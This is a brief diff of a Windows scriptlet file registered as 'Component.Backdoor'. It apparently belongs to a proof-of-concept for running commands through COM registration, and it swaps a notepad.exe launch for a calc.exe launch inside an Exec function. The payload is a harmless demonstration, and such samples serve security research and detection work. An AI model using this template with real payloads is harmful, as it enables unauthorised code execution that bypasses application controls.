@@ -4,7 +4,7 @@
 <registration
     description="Component"
     progid="Component.Backdoor"
-    version="1.00"
+    version="1.01"
     classid="{10001111-0000-0000-0000-00000000ACDC}"
 >
 </registration>
@@ -16,8 +16,10 @@
 <script language="JScript">
 <![CDATA[
 
-	var r = new ActiveXObject("WScript.Shell").Exec("notepad.exe");
-	
+	function Exec()
+	{
+		var r = new ActiveXObject("WScript.Shell").Exec("calc.exe");	
+	}
 ]]>
 </script>
 
